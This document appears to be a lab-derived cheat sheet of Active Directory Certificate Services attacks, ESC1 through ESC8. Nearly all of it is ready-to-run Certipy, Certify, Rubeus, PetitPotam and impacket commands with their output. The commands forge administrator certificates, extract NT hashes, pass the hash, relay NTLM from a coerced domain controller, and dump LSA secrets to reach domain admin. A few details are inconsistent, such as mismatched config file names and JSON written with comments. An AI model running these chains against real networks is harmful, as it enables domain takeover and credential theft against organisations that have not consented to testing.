# ADCS Attack Paths - Complete Reference

**ESC1-8 Exploitation with Actual Commands**

> **Note:** All usernames, passwords, hashes, IP addresses, and domain names have been sanitized for security.

---

## ESC1 - Client Authentication + SAN Control

### Linux Attack Path (Certipy)

**1. ENUMERATION**
```bash
certipy find -u 'user@domain.local' -p 'password' -dc-ip <DC_IP> -vulnerable
```

**Key Findings:**
- Template: ESC1
- ENROLLEE_SUPPLIES_SUBJECT: True
- Client Authentication: True
- Enrollment Rights: DOMAIN\Domain Users

**2. REQUEST MALICIOUS CERTIFICATE**
```bash
certipy req -u 'user@domain.local' -p 'password' \
  -dc-ip <DC_IP> -dc-host <DC_IP> \
  -ca 'domain-CA-NAME' -template ESC1 \
  -upn Administrator
```

**Output:**
```
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Saved certificate to 'administrator.pfx'
```

**3. AUTHENTICATE AND EXTRACT HASH**
```bash
certipy auth -pfx administrator.pfx \
  -username administrator -domain domain.local \
  -dc-ip <DC_IP>
```

**Output:**
```
[*] Got hash for 'administrator@domain.local':
aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
[*] Saved credential cache to 'administrator.ccache'
```

**4. PASS-THE-HASH**
```bash
impacket-wmiexec administrator@<DC_IP> -hashes :<NT_HASH>
```

**Result:**
```
C:\> whoami
domain\administrator

C:\> type C:\Users\Administrator\Desktop\flag.txt
HTB{REDACTED}
```

---

## ESC2 - Any Purpose EKU

### Linux Attack Path (Certipy)

**1. ENUMERATE ESC2 TEMPLATE**
```bash
certipy find -u 'user@domain.local' -p 'password' -dc-ip <DC_IP> -vulnerable
```

**Key Findings:**
- Template: ESC2
- Extended Key Usage: Any Purpose
- Enrollee Supplies Subject: True
- Client Authentication: True
- Enrollment Rights: DOMAIN\Domain Users

**2. REQUEST CERTIFICATE**
```bash
certipy req -u 'user@domain.local' -p 'password' \
  -target <DC_IP> -ca domain-CA-NAME \
  -template ESC2 -upn Administrator
```

**3. AUTHENTICATE**
```bash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**4. PASS-THE-HASH**
```bash
impacket-wmiexec administrator@<DC_IP> -hashes :<NT_HASH>
```

---

## ESC3 - Enrollment Agent Abuse

### Linux Attack Path (Certipy)

**1. ENUMERATE**
```bash
certipy find -u 'user@domain.local' -p 'password' -dc-ip <DC_IP> -vulnerable
```

**Key Findings:**
- Template ESC3: Certificate Request Agent EKU
- Template ESC2/User: Accepts enrollment agent requests

**2. REQUEST ENROLLMENT AGENT CERTIFICATE**
```bash
certipy req -u 'user@domain.local' -p 'password' \
  -ca 'domain-CA-NAME' -template 'ESC3'
```

**Output:**
```
[*] Saved certificate to 'user.pfx'
```

**3. REQUEST CERTIFICATE ON BEHALF OF ADMINISTRATOR**
```bash
certipy req -u 'user@domain.local' -p 'password' \
  -ca 'domain-CA-NAME' -template 'User' \
  -on-behalf-of 'domain\administrator' -pfx user.pfx
```

**Output:**
```
[*] Saved certificate to 'administrator.pfx'
```

**4. AUTHENTICATE**
```bash
certipy auth -pfx administrator.pfx -username administrator \
  -domain domain.local -dc-ip <DC_IP>
```

**Output:**
```
[*] Got hash for 'administrator@domain.local':
aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
```

**5. PASS-THE-HASH**
```bash
impacket-wmiexec administrator@<DC_IP> -hashes :<NT_HASH>
```

---

## ESC4 - Template ACL Abuse

### Linux Attack Path (Certipy v5.0.4+)

**1. ENUMERATE VULNERABLE TEMPLATE**
```bash
certipy find -u 'user@domain.local' -p 'password' -dc-ip <DC_IP> -vulnerable
```

**Key Finding:**
- Template ESC4: User has Full Control

**2. SAVE CURRENT CONFIGURATION**
```bash
certipy template -u 'user@domain.local' -p 'password' \
  -dc-ip <DC_IP> -template ESC4 \
  -save-configuration esc4_backup.json
```

**3. MANUAL JSON EDITING (CRITICAL STEP)**

Edit `esc4.json` to include BOTH EKU attributes:

```json
{
  "pKIExtendedKeyUsage": [
    "1.3.6.1.5.5.7.3.2",  // Client Authentication
    "1.3.6.1.5.5.7.3.4",  // Secure Email
    "1.3.6.1.4.1.311.10.3.4"
  ],
  "msPKI-Certificate-Application-Policy": [
    "1.3.6.1.5.5.7.3.2",  // CRITICAL - Client Auth
    "1.3.6.1.5.5.7.3.4",
    "1.3.6.1.4.1.311.10.3.4"
  ],
  "msPKI-Certificate-Name-Flag": 1,  // ENROLLEE_SUPPLIES_SUBJECT
  "msPKI-Enrollment-Flag": 0  // Remove PEND_ALL_REQUESTS
}
```

**4. APPLY MODIFIED CONFIGURATION**
```bash
certipy template -u 'user@domain.local' -p 'password' \
  -dc-ip <DC_IP> -template ESC4 \
  -configuration esc4.json
```

**5. WAIT FOR PROPAGATION (5-10 minutes)**
```
# Or restart CA services if you have access
```

**6. REQUEST CERTIFICATE FROM MODIFIED TEMPLATE**
```bash
certipy req -u 'user@domain.local' -p 'password' \
  -ca domain-CA-NAME -dc-ip <DC_IP> \
  -target <DC_IP> -template ESC4 \
  -upn Administrator
```

**7. AUTHENTICATE**
```bash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP> -domain domain.local
```

---

## ESC5 - PKI Object ACL Abuse

### Windows Attack Path (Certify.exe)

**Prerequisite:** Local admin on CA server

**1. REQUEST SUBCA CERTIFICATE (WILL BE DENIED)**
```cmd
C:\tools> .\Certify.exe request /ca:CA-SERVER.domain.local\domain-CA-NAME \
  /template:SubCA /altname:Administrator
```

**Output:**
```
[*] Request ID: 14
[-] Denied by Policy Module (0x80094012)
[*] Private key saved to cert.pem
```

**2. APPROVE REQUEST USING CA MMC (LOCAL ADMIN)**
```cmd
C:\tools> certsrv.msc
# Navigate: Pending Requests → Request ID 14 → Right-click → Issue
```

**3. DOWNLOAD APPROVED CERTIFICATE**
```cmd
C:\tools> .\Certify.exe download /ca:CA-SERVER.domain.local\domain-CA-NAME /id:14
```

**4. MERGE CERTIFICATE AND PRIVATE KEY**
```
# Save private key separately before download overwrites it
# Use openssl to create .pfx with both cert and key
```

**5. AUTHENTICATE**
```cmd
C:\tools> .\Rubeus.exe asktgt /user:administrator \
  /certificate:administrator.pfx /getcredentials
```

---

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Vulnerability:** CA-level flag allows SAN specification on ANY template

**ENUMERATION**
```bash
certipy find -u user@domain.local -p password -dc-ip <DC_IP> -vulnerable
```

**Look for:**
```
[!] UserSpecifiedSAN: EDITF_ATTRIBUTESUBJECTALTNAME2 set
```

**EXPLOITATION**
```bash
# Any enrollable template becomes ESC1-like
certipy req -u user@domain.local -p password \
  -ca CA-NAME -template User \
  -upn administrator@domain.local
```

---

## ESC7 - CA ACL Abuse

### ESC7.1 - ManageCertificates Permission

**Linux Attack Path (Certipy)**

**1. ENUMERATE CA PERMISSIONS**
```bash
certipy find -u 'user@domain.local' -p 'password' \
  -dc-ip <DC_IP> -vulnerable -stdout
```

**Key Finding:**
- User has ManageCA permission

**2. ADD YOURSELF AS CERTIFICATE OFFICER**
```bash
certipy ca -u 'user@domain.local' -p 'password' \
  -ca domain-CA-NAME -add-officer user
```

**3. REQUEST CERTIFICATE (DENIED, REQUIRES APPROVAL)**
```bash
certipy req -u 'user@domain.local' -p 'password' \
  -ca domain-CA-NAME -target <CA_IP> \
  -template ESC7_1 -upn Administrator
```

**Output:**
```
[*] Request ID: 64
[!] Request is pending approval
[*] Saved private key to 'administrator.key'
```

**4. APPROVE YOUR OWN REQUEST**
```bash
certipy ca -u 'user@domain.local' -p 'password' \
  -ca domain-CA-NAME -issue-request 64
```

**Output:**
```
[*] Successfully issued certificate
```

**5. RETRIEVE APPROVED CERTIFICATE**
```bash
certipy req -u 'user@domain.local' -p 'password' \
  -ca domain-CA-NAME -retrieve 64
```

**6. AUTHENTICATE**
```bash
certipy auth -pfx administrator.pfx -username administrator \
  -domain domain.local -dc-ip <DC_IP>
```

**Output:**
```
[*] Got hash for 'administrator@domain.local':
aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
```

**7. DOMAIN ADMIN ACCESS**
```bash
evil-winrm -i <DC_IP> -u Administrator -H <NT_HASH>
```

---

## ESC8 - NTLM Relay to HTTP Enrollment

### Linux Attack Path (Certipy + Coercer)

**Network Setup:**
- DC: <DC_IP> (coercion target)
- CA Server: <CA_IP> (relay target)
- Attack box: <ATTACKER_IP> (listener)

**1. ENUMERATE ESC8 VULNERABILITY**
```bash
certipy find -u user -p 'password' -dc-ip <DC_IP> -vulnerable -stdout
```

**Key Finding:**
```
• ESC8: Web Enrollment enabled over HTTP
• Target: http://<CA_IP>/certsrv/certfnsh.asp
```

**2. START CERTIPY RELAY (TERMINAL 1)**
```bash
sudo certipy relay -ca domain-CA-NAME -template Machine \
  -target http://<CA_IP>/certsrv/certfnsh.asp
```

**Output:**
```
[*] Targeting http://<CA_IP>/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
```

**3. COERCE AUTHENTICATION (TERMINAL 2)**
```bash
python3 PetitPotam.py -u user -p 'password' -d domain.local \
  <ATTACKER_IP> <TARGET_IP>
```

**Output:**
```
[*] Sending EfsRpcOpenFileRaw!
[+] Attack worked!
```

**TERMINAL 1 UPDATES:**
```
[*] SMBD-Thread-3: Connection from <TARGET_IP>
[*] Got certificate for 'MACHINE$'
[*] Saved certificate to 'machine.pfx'
```

**4. EXTRACT MACHINE ACCOUNT HASH**
```bash
certipy auth -pfx machine.pfx -dc-ip <DC_IP>
```

**Output:**
```
[*] Using principal: machine$@domain.local
[*] Got TGT
[*] Saved credential cache to 'machine.ccache'
[*] Got hash for 'machine$@domain.local':
aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
```

**5. ACCESS COMPROMISED MACHINE**
```bash
impacket-wmiexec -hashes :<NT_HASH> 'domain.local/machine$@<TARGET_IP>'
```

**Output:**
```
C:\Windows\system32> whoami
nt authority\system
```

**6. DUMP CREDENTIALS FROM COMPROMISED MACHINE**
```bash
proxychains -q impacket-secretsdump -hashes :<NT_HASH> \
  'domain.local/machine$@<TARGET_IP>'
```

**Output:**
```
[*] Dumping LSA Secrets
domain.local\privileged_user:password_value
```

**7. ESCALATE TO DOMAIN ADMIN (ESC7.1)**

User has ManageCertificates permission

**Request certificate as Administrator (pending):**
```bash
certipy req -u lowpriv -p 'password' -ca domain-CA-NAME \
  -dc-ip <DC_IP> -target <CA_IP> \
  -template VPN_Users -upn administrator@domain.local
```

**Output:**
```
[*] Request ID is 19
[!] Got error: The request is pending approval
```

**Approve with privileged user's permissions:**
```bash
certipy ca -u privileged_user@domain.local -p 'password' \
  -dc-ip <DC_IP> -ca domain-CA-NAME \
  -target <CA_IP> -issue-request 19
```

**Output:**
```
[*] Successfully issued certificate
```

**Retrieve certificate:**
```bash
certipy req -u lowpriv -p 'password' -ca domain-CA-NAME \
  -dc-ip <DC_IP> -target <CA_IP> -retrieve 19
```

**Authenticate as Administrator:**
```bash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**Output:**
```
[*] Got hash for 'administrator@domain.local':
aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
```

**Domain Admin shell:**
```bash
impacket-wmiexec -hashes :<NT_HASH> administrator@<DC_IP>
```

**Result:**
```
C:\> whoami
domain\administrator
```

---

## Key Takeaways

- **ESC1:** Direct SAN control - fastest path to DA
- **ESC2:** Any Purpose EKU - same as ESC1 but broader
- **ESC3:** Two-stage attack via enrollment agent
- **ESC4:** Modify template permissions to create ESC1
- **ESC5:** Local admin on CA → approve denied requests
- **ESC6:** CA flag makes ALL templates ESC1-like
- **ESC7:** ManageCA → self-approve or modify CA config
- **ESC8:** NTLM relay to HTTP enrollment endpoint

## Common Attack Pattern

All attacks follow same pattern:

1. **Enumerate** vulnerability
2. **Request/obtain** certificate
3. **Authenticate** with certificate
4. **Extract** hash or TGT
5. **Pass-the-hash** to domain admin

---

**Sources:**
- HTB Academy ADCS Module
- SpecterOps Certified Pre-Owned Research
- Personal lab testing and documentation

**Note:** This reference was reconstructed from conversation history after VM snapshot failure. All credentials and network details have been sanitized.
